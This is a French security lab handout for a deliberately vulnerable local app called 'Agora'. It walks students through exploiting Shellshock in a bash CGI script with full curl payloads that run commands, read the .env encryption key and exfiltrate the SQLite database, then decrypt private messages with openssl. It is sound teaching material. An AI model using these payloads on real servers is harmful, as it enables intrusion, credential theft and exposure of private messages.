# Agora — TP sécurité

Agora est un petit réseau social (amis, posts, chat privé) utilisé par le cercle d'Alice.

## Le but du TP

Alice possède un coffre. Elle en a communiqué le **code** à **une seule personne** de son entourage, dans un message privé.

**Objectif : découvrir qui détient le code du coffre d'Alice.**

## Qui êtes-vous

Vous êtes **Pierre**, un proche qui s'est introduit dans le cercle d'Alice. Vous disposez d'un compte sur Agora :

- identifiant : `pierre`
- mot de passe : `avionQuiVole`

Connectez-vous avec ce compte pour commencer à explorer le réseau.

Les messages ne sont pas lisibles directement : ils sont chiffrés. Pour y arriver, vous devez récupérer **deux choses** sur le serveur :

1. la base de données **SQLite** (`db/app.db`) ;
2. la **clé de chiffrement**, qui se trouve dans le fichier **`.env`**.

Avec la base et la clé, déchiffrez les messages et retrouvez la personne qui possède le code.

## Lancer le site

Récupérez l'archive `agora-tp.tar.gz`, puis :

```bash
gunzip -c agora-tp.tar.gz | docker load
docker run --rm -p 3000:3000 -p 8080:80 agora-tp
```

Le site tourne sur http://localhost:3000.

## Vérifier que la faille Shellshock est présente

Ouvrez un autre terminal et lancez :

```bash
curl -s -H 'User-Agent: () { :;}; echo; /usr/bin/id' http://localhost:8080/cgi-bin/status.sh
```

S'il y a une réponse (l'identité de l'utilisateur du serveur), la faille **Shellshock** est présente.

On appelle le script `status.sh` car, pour que la faille fonctionne, il faut viser un script **exécuté par bash** (un CGI) : c'est lui qui déclenche la vulnérabilité, pas une simple page web.

## Étape 1 — Reconnaissance sur le site

Allez sur http://localhost:3000 et connectez-vous avec les identifiants de Pierre.
Trouvez le post qui indique **qui est susceptible d'avoir reçu** le code du coffre fort d'Alice.

## Étape 2 — Récupérer la clé

Après avoir vu les posts, récupérez les fichiers du serveur via la faille.

Commandes utiles pour construire la requête :

- `curl -s -H 'User-Agent: () { :;}; echo; <commande à exécuter>'` : injecte la commande via l'en-tête ;
- `http://localhost:8080/cgi-bin/status.sh` : l'URL à appeler (le script bash vulnérable) ;
- `/bin/cat` : pour afficher le contenu d'un fichier ;
- les variables d'environnement (dont la clé) sont dans `/app/.env`.

Récupérer la clé de chiffrement :

```bash
curl -s -H 'User-Agent: () { :;}; echo; /bin/cat /app/.env' http://localhost:8080/cgi-bin/status.sh
```

## Étape 3 — Récupérer la base de données

Après avoir la clé, il faut récupérer la base de données SQLite.
Comme c'est un fichier binaire, on l'encode en base64 pour le faire passer par `curl`, puis on le décode une fois reçu.

- `/usr/bin/base64 <fichier>` : encode un fichier en base64 (côté serveur) ;
- `base64 -d` : décode le base64 sur votre machine (à chaîner avec un `|`) ;
- enregistrez le résultat dans un fichier en `.db` pour pouvoir l'ouvrir avec SQLite.

```bash
curl -s -H 'User-Agent: () { :;}; echo; /usr/bin/base64 /app/db/app.db' http://localhost:8080/cgi-bin/status.sh | base64 -d > app.db
```

## Étape 4 — Lire la base et déchiffrer les messages

Les messages sont stockés chiffrés, au format `iv:texte_chiffré` (AES-256-CBC).

Lister les messages chiffrés :

```bash
sqlite3 app.db 'SELECT content FROM messages'
```

Mettre la clé récupérée à l'étape 2 dans une variable **`KEY`** (remplacez par la vraie valeur lue dans `.env`) :

```bash
KEY=la_cle_hex_lue_dans_le_env
```

> Vérifiez avec `echo "$KEY"` : si c'est vide (par exemple dans un nouveau terminal) ou trop court, openssl affichera `hex string is too short` puis `bad decrypt`. Redéfinissez `KEY` dans ce cas.

Déchiffrer une ligne : collez une ligne de la liste dans `ligne='...'`, le découpage `iv` / texte chiffré se fait tout seul :

```bash
ligne='COLLER_UNE_LIGNE_ICI'
iv="${ligne%%:*}"      # avant le :
data="${ligne#*:}"     # après le :
echo "$data" | openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -A -base64
```

Répétez pour chaque message jusqu'à trouver celui qui contient le code du coffre, et identifiez la personne à qui Alice l'a confié.

